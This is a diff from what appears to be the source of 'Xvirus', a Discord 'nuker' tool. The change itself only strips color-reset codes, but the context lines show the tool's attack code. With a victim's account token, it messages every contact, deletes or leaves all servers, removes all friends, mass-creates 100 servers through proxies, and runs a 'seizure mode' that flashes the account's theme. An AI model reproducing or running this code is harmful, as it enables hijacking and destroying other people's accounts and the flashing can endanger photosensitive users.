@@ -27,7 +27,7 @@ def Xvirus_Nuke(token, Server_Name, message_Content):
             print(f"{Fore.RED}Messaged ID: {Fore.WHITE}"+channel['id']+Fore.RESET)
         except Exception as e:
             print(f"The following error has been encountered and is being ignored: {e}")
-    print(f"{Fore.RED}Sent a Message to all available friends.{Fore.RESET}\n")
+    print(f"{Fore.RED}Sent a Message to all available friends.\n")
     
     guildsIds = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=getheaders(token)).json()
     for guild in guildsIds:
@@ -44,7 +44,7 @@ def Xvirus_Nuke(token, Server_Name, message_Content):
             print(f'{Fore.RED}Deleted guild: {Fore.WHITE}'+guild['name']+Fore.RESET)
         except Exception as e:
             print(f"The following error has been encountered and is being ignored: {e}")
-    print(f"{Fore.YELLOW}Deleted/Left all available guilds.{Fore.RESET}\n")
+    print(f"{Fore.YELLOW}Deleted/Left all available guilds.\n")
 
     friendIds = requests.get("https://discord.com/api/v10/users/@me/relationships", proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
     for friend in friendIds:
@@ -55,17 +55,17 @@ def Xvirus_Nuke(token, Server_Name, message_Content):
             print(f"{Fore.GREEN}Removed friend: {Fore.WHITE}"+friend['user']['username']+"#"+friend['user']['discriminator']+Fore.RESET)
         except Exception as e:
             print(f"The following error has been encountered and is being ignored: {e}")
-    print(f"{Fore.GREEN}Removed all available friends.{Fore.RESET}\n")
+    print(f"{Fore.GREEN}Removed all available friends.\n")
     
     for i in range(100):
         try:
             payload = {'name': f'{Server_Name}', 'region': 'europe', 'icon': None, 'channels': None}
             requests.post('https://discord.com/api/v10/guilds', proxies={"http": f'{proxy()}'}, headers=getheaders(token), json=payload)
             setTitle(f"Creating {Server_Name} #{i}")
-            print(f"{Fore.BLUE}Created {Server_Name} #{i}.{Fore.RESET}")
+            print(f"{Fore.BLUE}Created {Server_Name} #{i}.")
         except Exception as e:
             print(f"The following error has been encountered and is being ignored: {e}")
-    print(f"{Fore.BLUE}Created all servers.{Fore.RESET}\n")
+    print(f"{Fore.BLUE}Created all servers.\n")
     t.do_run = False
     requests.delete("https://discord.com/api/v10/hypesquad/online", proxies={"http": f'{proxy()}'}, headers=getheaders(token))
     setting = {
@@ -94,7 +94,7 @@ def Xvirus_Nuke(token, Server_Name, message_Content):
     Xvirus.main()
 
 def CustomSeizure(token):
-    print(f'{Fore.MAGENTA}Starting seizure mode {Fore.RESET}{Fore.WHITE}(Switching on/off Light/dark mode){Fore.RESET}\n')
+    print(f'{Fore.MAGENTA}Starting seizure mode {Fore.WHITE}(Switching on/off Light/dark mode)\n')
     t = threading.currentThread()
     while getattr(t, "do_run", True):
         modes = cycle(["light", "dark"])
